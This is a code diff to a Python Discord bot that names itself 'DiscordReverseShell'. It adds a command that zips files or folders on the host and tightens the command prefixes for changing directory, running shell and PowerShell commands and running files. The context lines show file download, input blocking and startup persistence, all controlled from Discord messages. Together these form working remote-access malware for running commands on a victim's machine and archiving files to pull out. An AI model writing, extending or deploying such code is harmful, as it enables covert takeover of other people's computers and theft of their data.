@@ -243,6 +243,29 @@ def unblock_input():
         except: pass
 
 
+def zip(path):
+    name = f"{os.path.basename(path)}.zip"
+
+    if os.path.isfile(path):
+        try:
+            with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as f: f.write(path, os.path.basename(path))
+            return True
+        except: return False
+        
+    elif os.path.isdir(path):
+        try:
+            with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as f:
+                for root, _, files in os.walk(path):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        f.write(file_path, os.path.relpath(file_path, path))
+
+            return True
+        except: return False
+
+    else: return False
+
+
 @client.event
 async def on_ready():
     guild = client.get_guild(int(GUILD_ID))
@@ -339,9 +362,9 @@ async def on_message(message):
             await message.reply(embed=embed)
     
 #! CD
-    elif message.content.startswith("cd"):
+    elif message.content.startswith("cd "):
         directory = message.content[3:] #.split(" ")[1]
-        if directory == "//root": 
+        if directory == "///root": 
             os.chdir(os.path.dirname(sys.argv[0]))
             embed = discord.Embed(title="Changed Directory to ROOT", description=f"```{os.getcwd()}```", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
@@ -381,6 +404,26 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+#! ZIP
+    elif message.content.startswith("zip "):
+        path = message.content[4:]
+        name = f"{os.path.basename(path)}.zip"
+
+        if os.path.exists(path):
+            if zip(path):
+                embed = discord.Embed(title="Zip", description=f"```Zipped file: {path} to {name}```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+            else:
+                embed = discord.Embed(title="Zip", description=f"```Failed to zip file: '{path}'!```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+        else:
+            embed = discord.Embed(title="Zip", description="```Invalid path!```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed)
+
+
 #! DOWNLOAD
     elif message.content.startswith("download"):
         file = message.content[9:] #.split(" ")[1]
@@ -408,7 +451,7 @@ async def on_message(message):
         await message.reply(embed=embed)
 
 #! CMD
-    elif message.content.startswith("cmd"):
+    elif message.content.startswith("cmd "):
         command = message.content[4:]
         try:
             output = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
@@ -451,7 +494,7 @@ async def on_message(message):
         await message.reply(embed=embed)
         
 #! POWERSHELL    
-    elif message.content.startswith("pw"):
+    elif message.content.startswith("pw "):
         command = message.content[3:]
         try:
             output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
@@ -494,7 +537,7 @@ async def on_message(message):
         await message.reply(embed=embed)
 
 #! RUN
-    elif message.content.startswith("run"):
+    elif message.content.startswith("run "):
         file = message.content[4:]
         if file == "":
             message.reply("Please specify a file to run!")
@@ -770,4 +813,6 @@ else: Startup(sys.argv[0])
 
 
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
